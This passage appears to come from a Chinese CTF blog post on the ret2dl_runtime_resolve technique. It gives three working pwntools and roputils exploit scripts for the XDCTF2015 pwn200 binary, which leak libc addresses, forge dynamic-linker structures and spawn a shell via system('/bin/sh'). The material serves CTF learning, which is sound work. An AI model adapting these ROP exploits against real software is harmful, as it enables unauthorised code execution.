class="string">'__main__'</span>:</span><br><span class="line">    write_plt = pwn200.plt[<span class="string">'write'</span>]</span><br><span class="line">    lg(<span class="string">'write_plt'</span>, write_plt)</span><br><span class="line">    write_got = pwn200.got[<span class="string">'write'</span>]</span><br><span class="line">    lg(<span class="string">'write_got'</span>, write_got)</span><br><span class="line">    start_addr = pwn200.symbols[<span class="string">'_start'</span>]</span><br><span class="line">    lg(<span class="string">'start_addr'</span>, start_addr)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x6c</span></span><br><span class="line">    payload += <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(start_addr)</span><br><span class="line">    payload += p32(<span class="number">1</span>)</span><br><span class="line">    payload += p32(write_got)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    write_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">    lg(<span class="string">'write_addr'</span>, write_addr)</span><br><span class="line"></span><br><span class="line">    libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    lg(<span class="string">'libc_addr'</span>, libc_base)</span><br><span class="line">    lg(<span class="string">'system_addr'</span>, system_addr)</span><br><span class="line">    lg(<span class="string">'binsh_addr'</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x6c</span></span><br><span class="line">    payload += <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    payload += p32(system_addr)</span><br><span class="line">    payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    pi()</span><br></pre></td></tr></table></figure>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><ul>
+<li>直接使用了<code>roputils</code>库，比较简洁</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">'main'</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./'</span> + processName)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">rop = ROP(<span class="string">'./'</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/23.png" alt="image.png"></p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><ul>
+<li>其实一步一步伪构造能更容易理解过程，可以参考<a href="https://xz.aliyun.com/t/5122" rel="external nofollow noopener noreferrer" target="_blank">高级ROP ret2dl_runtime 之通杀详解</a>和<a href="https://bbs.pediy.com/thread-250703.htm" rel="external nofollow noopener noreferrer" target="_blank">ROP高级用法之ret2_dl_runtime_resolve</a></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/24.jpg" alt="构造的ROP"></p>
+<ul>
+<li>上面构造的<code>ROP</code>左边是做一个栈的迁移</li>
+<li>右边是伪造的解析链</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">name = <span class="string">'./main'</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0804851D</span></span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x8</span></span><br><span class="line"><span class="comment">#n index_arg</span></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system"</span>+<span class="string">'\x00'</span>+<span class="string">'\x00'</span></span><br><span class="line">fake_dynstr += <span class="string">"/bin/sh"</span>+<span class="string">'\x00'</span></span><br><span class="line">pay1 = <span class="string">'a'</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">'aaaa'</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">success(<span class="string">".rel_plt: "</span> + hex(rel_plt_addr))</span><br><span class="line">success(<span class="string">".dynsym: "</span> + hex(dynsym_addr))</span><br><span class="line">success(<span class="string">".dynstr: "</span> + hex(dynstr_addr))</span><br><span class="line">success(<span class="string">"fake_rel_plt_addr: "</span> + hex(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">"fake_dynsym_addr: "</span> + hex(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">"fake_dynstr_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">"n: "</span> + hex(n))</span><br><span class="line">success(<span class="string">"r_info: "</span> + hex(r_info))</span><br><span class="line">success(<span class="string">"offset: "</span> + hex(str_offset))</span><br><span class="line">success(<span class="string">"system_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">"bss_addr: "</span> + hex(elf.bss()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/25.png" alt="image.png"></p>
+
+      <script>
+        window.disqusProxy={
+          shortname: 'undefined',
+          username: 'pikachu',
+          server: 'undefined',
+          port: 5509,
+          adminAvatar: '/avatars/admin-avatar.jpg',
+          identifier: '2020/dl-runtime-resolve/',
+        };
+        window.disqus_config = function () {
+          this.page.url = window.location.href;
+          this.page.identifier = window.disqusProxy.identifier;
+        };
+      </script>
+      
+    </div>
+
+<div style="text-align:center;color: #ccc;font-size:14px;">---------------- The End ----------------</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>谢谢大爷～</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/donate/wechat.png" alt="pikachu WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/donate/alipay.jpg" alt="pikachu Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+<div>
+	  
+	    <p id="div-border-left-red">
+		Author：<b>pikachu</b><br>
+		Link：<a href="/2020/dl-runtime-resolve/" title="dl-runtime-resolve">https://hitcxy.com/2020/dl-runtime-resolve/</a><br>
+		Contact：<a>hitcxy@hotmail.com</a><br>
+	   <b>本文基于<a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/" rel="external nofollow noopener noreferrer"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布</b><br>
+	    <b>转载请注明出处，谢谢！</b>
+	    </p>
+	  
+	</div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/elf/" rel="tag"><i class="fa fa-tag"></i> elf</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/ret2csu/" rel="next" title="ret2csu">
+                <i class="fa fa-chevron-left"></i> ret2csu
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/stepbystep-dl-runtime-resolve/" rel="prev" title="一步一步构建 dl-runtime-resolve">
+                一步一步构建 dl-runtime-resolve <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar/1.jpg" alt="pikachu">
+          <p class="site-author-name" itemprop="name">pikachu</p>
+          <p class="site-description motion-element" itemprop="description">帅 | 码渣 | 宅 | 金木粉</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">59</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hitcxy" target="_blank" rel="external nofollow noopener noreferrer" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow noopener noreferrer">
+              <img src="/images/cc-by-sa.svg" alt="Creative Commons">
+            </a>
+          </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              参考的博客
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://yangbingdong.com/" title="ookamiAntD" target="_blank" rel="external nofollow noopener noreferrer">ookamiAntD</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        <div id="days"></div>
+    <script>
+    function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("09/16/2019 21:51:10");
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=setzero(Math.floor(e_hrsold));
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+        seconds=setzero(Math.floor((e_minsold-minsold)*60));
+        document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+    }
+function setzero(i){
+    if (i<10)
+    {i="0" + i};
+    return i;
+}
+show_date_time();
+</script>
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dl-runtime-resolve函数具体运行模式"><span class="nav-number">1.</span> <span class="nav-text">_dl_runtime_resolve函数具体运行模式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#以puts为例追踪一下ELF文件libc函数解析过程"><span class="nav-number">2.</span> <span class="nav-text">以puts为例追踪一下ELF文件libc函数解析过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#call-puts-plt"><span class="nav-number">2.1.</span> <span class="nav-text">call   puts@plt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#si进入call-puts-plt"><span class="nav-number">2.2.</span> <span class="nav-text">si进入call   puts@plt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址"><span class="nav-number">2.3.</span> <span class="nav-text">因为会jmp   dword ptr [0x804a00c]，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts@plt第二条指令的地址，即read@got中初始存放read@plt的第二条指令地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jmp-0x80482d0"><span class="nav-number">2.4.</span> <span class="nav-text">jmp   0x80482d0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#那么我们看看通过这两个参数是如何找到puts函数的呢"><span class="nav-number">2.5.</span> <span class="nav-text">那么我们看看通过这两个参数是如何找到puts函数的呢</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用思路"><span class="nav-number">3.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#计算reloc-index"><span class="nav-number">3.1.</span> <span class="nav-text">计算reloc_index</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算r-info"><span class="nav-number">3.2.</span> <span class="nav-text">计算r_info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算st-name"><span class="nav-number">3.3.</span> <span class="nav-text">计算st_name</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#例子"><span class="nav-number">4.</span> <span class="nav-text">例子</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一"><span class="nav-number">4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法三"><span class="nav-number">4.3.</span> <span class="nav-text">方法三</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+	<!-- <img style="position: absolute;top: 0;left: 15%;border: 0;width: 200px;height: 200px;" src="http://ojoba1c98.bkt.clouddn.com/img/coding-flag.png" alt="Coding Flag"> -->
+      <div class="footer-inner">
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user">本站访客数</i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span>人次</span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye">本站总访问量</i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span>次</span>
+  
+  
+</div>
+
+
+
+        <div class="copyright">
+  
+  &copy;  2019 - 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-flash"></i>
+  </span> | <span class="post-count">共43.6k字</span>
+</div>
+
+
+<!-- <div class="theme-info">
+  由  强力驱动
+</div> --!>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://www.beian.miit.gov.cn/" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖ICP备20013338号</p>
+  </a>
+</div>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=34122102000129" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/beian.png" style="float:left;"/>
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖公网安备 34122102000129号</p>
+  </a>
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="/js/src/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    new Valine({
+        lang: 'zh-cn',
+        admin_email: '757610839@qq.com',
+        el: '#comments' ,
+        appId: '8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz',
+        appKey: 'DCF1KCbdAOySKCu1Ooc0J5ku',
+        emoticon_url: 'https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/gif/',
+        emoticon_list: ["弹肚皮.gif","动次打次.gif","抖脚脚.gif","慌张.gif","夹住.gif","开车.gif","抖眼镜.gif","吃东西.gif","动耳朵.gif","哭唧唧.gif","小花花.gif","眨眼.gif","跳舞.gif","风吹秀发.gif","摇头.gif","眼睛转.gif","跳着走.gif","抖眼.gif","绿色的.gif","我走了.gif","浪起来.gif","打篮球.gif","都是小心心.gif","比心心.gif","吹风.gif","吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+        placeholder: '点击此处填写昵称和邮箱才能留言噢~',
+  });
+  </script>
+
+
+
+
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz", "DCF1KCbdAOySKCu1Ooc0J5ku");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
